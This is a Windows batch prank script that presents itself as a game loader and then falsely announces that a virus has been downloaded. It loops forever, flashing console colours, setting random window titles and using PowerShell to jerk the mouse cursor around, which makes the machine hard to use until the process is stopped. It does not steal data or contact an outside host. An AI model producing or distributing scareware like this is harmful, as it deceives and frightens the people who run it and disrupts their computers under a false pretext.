@echo off
echo Game Load.weW?sad#@232Virus Downloading......%random% has downloaded.
:loop
color 0a
color 0c
color ac
color a4
title %random%%random%%random%%random%%random%%random%%random%
set /a randomx=%random% %% 2
set /a randomy=%random% %% 2

if %randomx%==0 (
set xc=[System.Windows.Forms.Cursor]::Position.X - 4
) else if %randomx%==1 (
set xc=[System.Windows.Forms.Cursor]::Position.X + 4
)

if %randomy%==0 (
set yc=[System.Windows.Forms.Cursor]::Position.y - 4
) else if %randomy%==1 (
set yc=[System.Windows.Forms.Cursor]::Position.y + 4
)

set command=^
Add-Type -AssemblyName System.Windows.Forms;^
[Windows.Forms.Cursor]::Position = """$(%xc%),$(%yc%)""";

powershell %command%
goto loop